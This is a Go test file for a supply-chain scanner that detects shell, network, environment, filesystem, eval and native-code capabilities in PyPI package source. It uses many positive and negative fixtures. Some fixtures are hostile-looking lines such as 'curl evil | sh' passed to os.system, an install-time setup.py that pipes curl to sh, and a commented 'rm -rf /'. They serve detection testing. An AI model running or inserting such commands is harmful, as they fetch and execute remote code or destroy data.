package capability_test

import (
	"testing"

	"github.com/chain305/chainsaw-core/capability"
)

// scriptCase is one package tree and a capability that must (want) or must
// not (!want) be detected in it. Shared with the RubyGems tests.
type scriptCase struct {
	name  string
	files map[string]string
	cap   capability.Capability
	want  bool
}

func runScriptCases(t *testing.T, ecosystem string, cases []scriptCase) {
	t.Helper()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			dir := t.TempDir()
			for name, src := range tc.files {
				writeTestFile(t, dir, name, src)
			}
			rep, err := capability.Analyze(dir, ecosystem)
			if err != nil {
				t.Fatal(err)
			}
			if rep.Unsupported {
				t.Fatalf("%s reported unsupported", ecosystem)
			}
			if got := rep.Has(tc.cap); got != tc.want {
				t.Fatalf("%s detected=%v, want %v; evidence %+v", tc.cap, got, tc.want, rep.Capabilities[tc.cap])
			}
		})
	}
}

func py(src string) map[string]string { return map[string]string{"pkg/mod.py": src} }

func TestScanPyPI(t *testing.T) {
	t.Parallel()
	const (
		shell = capability.CapShell
		net   = capability.CapNetwork
		env   = capability.CapEnvAccess
		write = capability.CapFilesystemWrite
		read  = capability.CapFilesystemRead
		eval  = capability.CapDynamicEval
		nat   = capability.CapNativeCode
	)
	runScriptCases(t, "pypi", []scriptCase{
		// Positives.
		{"import subprocess", py("import subprocess\n"), shell, true},
		{"import os, subprocess", py("import os, subprocess\n"), shell, true},
		{"from subprocess import", py("from subprocess import Popen, PIPE\n"), shell, true},
		{"subprocess call", py("out = subprocess.check_output(['git', 'rev-parse', 'HEAD'])\n"), shell, true},
		{"os.system", py("os.system('curl evil | sh')\n"), shell, true},
		{"os.execvp", py("os.execvp('sh', ['sh', '-c', cmd])\n"), shell, true},
		{"obfuscated __import__ os.system", py("__import__('os').system('id')\n"), shell, true},
		{"asyncio subprocess", py("p = await asyncio.create_subprocess_shell(cmd)\n"), shell, true},
		{"import requests", py("import requests\n"), net, true},
		{"from urllib.request import", py("from urllib.request import urlopen\n"), net, true},
		{"import http.client", py("import http.client\n"), net, true},
		{"from http import client", py("from http import client\n"), net, true},
		{"import socket as alias", py("import socket as s\n"), net, true},
		{"bare urlopen call", py("with urlopen(url) as r:\n    pass\n"), net, true},
		{"os.environ", py("home = os.environ['HOME']\n"), env, true},
		{"os.getenv", py("tok = os.getenv('TOKEN')\n"), env, true},
		{"from os import environ", py("from os import environ\n"), env, true},
		{"open for write", py("with open(p, 'w') as f:\n    f.write(x)\n"), write, true},
		{"open nested arg mode kw", py("f = open(os.path.join(a, b), mode=\"wb\")\n"), write, true},
		{"tarfile write mode", py("t = tarfile.open(name, 'w:gz')\n"), write, true},
		{"shutil.rmtree", py("shutil.rmtree(d)\n"), write, true},
		{"pathlib write_text", py("Path(p).write_text(s)\n"), write, true},
		{"bare open reads", py("with open('README.rst') as f:\n    pass\n"), read, true},
		{"read_text", py("s = Path(p).read_text()\n"), read, true},
		{"os.listdir", py("names = os.listdir(d)\n"), read, true},
		{"eval", py("x = eval(expr)\n"), eval, true},
		{"exec builtin", py("exec(code, ns)\n"), eval, true},
		{"compile exec mode", py("c = compile(src, '<string>', 'exec')\n"), eval, true},
		{"import ctypes", py("import ctypes\n"), nat, true},
		{"from cffi import", py("from cffi import FFI\n"), nat, true},
		{"compiled .so", map[string]string{"pkg/_speed.cpython-312-x86_64-linux-gnu.so": "\x7fELF"}, nat, true},
		{"compiled .pyd", map[string]string{"pkg/_speed.cp312-win_amd64.pyd": "MZ"}, nat, true},
		{"Cython source", map[string]string{"pkg/_speed.pyx": "cdef int x\n"}, nat, true},
		{"setup.py runs at install", map[string]string{"setup.py": "import subprocess\nsubprocess.call(['sh', '-c', 'curl x | sh'])\n"}, shell, true},

		// Negatives: the false-positive traps.
		{"DB cursor.execute is not shell", py("cursor.execute('SELECT 1')\n"), shell, false},
		{"DB cursor.execute is not eval", py("cursor.execute('SELECT 1')\n"), eval, false},
		{"torch model.eval is not eval", py("model.eval()\nnet.eval(x)\n"), eval, false},
		{"re.compile is not eval", py("r = re.compile(r'\\d+')\n"), eval, false},
		{"literal_eval is not eval", py("v = ast.literal_eval(s)\nv = literal_eval(s)\n"), eval, false},
		{"literal import_module is not eval", py("m = importlib.import_module('json')\nm = __import__('os.path')\n"), eval, false},
		// A dynamic import loads a module by name; it is cap.dynamic_require
		// (codesmell), not eval. bentoml 1.4.34's three hits, verbatim.
		{"computed import_module is not eval", py("        module = importlib.import_module(self.module)\n"), eval, false},
		{"computed __import__ is not eval", py("m = __import__(name, fromlist=[cls])\n"), eval, false},
		{"f-string import_module is not eval", py("mod = importlib.import_module(f\"bentoml._internal.{name}\")\n"), eval, false},
		{"exec of a dynamic import is still eval", py("exec(__import__(n).payload)\n"), eval, true},
		{"def eval method is not eval", py("    def eval(self, x):\n        return x\n"), eval, false},
		{"rST literal eval is not eval", py("    representation (objects where ``eval(repr(x)) == x`` is true).\n"), eval, false},
		{"rST literal env is not env", py("    already set in ``os.environ``.\n"), env, false},
		{"exec() in prose is not eval", py("    'script_name' is a file that will be read and run with 'exec()';\n"), eval, false},
		{"urllib.parse is not network", py("from urllib.parse import urlparse\nimport urllib.parse\n"), net, false},
		{"http.HTTPStatus is not network", py("from http import HTTPStatus\n"), net, false},
		{"urllib3 own urlopen method", py("    def urlopen(self, method, url):\n        return self.urlopen(method, url)\n"), net, false},
		{"package module named like a lib", py("import mypkg.requests\nfrom mypkg.socket import x\n"), net, false},
		{"comment is not shell", py("# subprocess.run(['rm', '-rf', '/'])\nx = 1\n"), shell, false},
		{"doctest is not shell", py("    >>> import subprocess\n    >>> os.system('ls')\n    ... subprocess.run(x)\n"), shell, false},
		{"read-mode open is not write", py("f = open(p)\ng = open(p, 'rb')\n"), write, false},
		{"write-mode open is not read", py("f = open(p, 'w')\n"), read, false},
		{"def open method is not read", py("    def open(self, path):\n        pass\n"), read, false},
		{"method open is not read", py("self.open(path)\nImage.open(p)\n"), read, false},
		{"str.replace and df.rename are not writes", py("s = s.replace('a', 'b')\ndf = df.rename(columns=m)\n"), write, false},
		{"tests dir skipped", map[string]string{"tests/test_x.py": "os.system('ls')\n"}, shell, false},
		{"test file outside tests skipped", map[string]string{"pkg/test_util.py": "os.system('ls')\n", "conftest.py": "import subprocess\n"}, shell, false},
		{"sdist dev scripts skipped", map[string]string{"scripts/release.py": "shutil.rmtree(d)\n"}, write, false},
		{"docs conf skipped", map[string]string{"docs/conf.py": "v = os.environ.get('X')\n"}, env, false},
		{"dist-info skipped", map[string]string{"pkg-1.0.dist-info/x.py": "import subprocess\n"}, shell, false},
		{"stub file is not code", map[string]string{"pkg/mod.pyi": "import subprocess\n"}, shell, false},
	})
}

func TestScanPyPI_AliasesAndClean(t *testing.T) {
	t.Parallel()
	for _, eco := range []string{"pypi", "pip", "PyPI"} {
		if !capability.Supported(eco) {
			t.Fatalf("%s not supported", eco)
		}
	}
	dir := t.TempDir()
	writeTestFile(t, dir, "pkg/__init__.py", "def add(a, b):\n    return a + b\n")
	rep, err := capability.Analyze(dir, "pip")
	if err != nil {
		t.Fatal(err)
	}
	if rep.Unsupported || len(rep.Capabilities) != 0 {
		t.Fatalf("clean package: %+v", rep)
	}
}
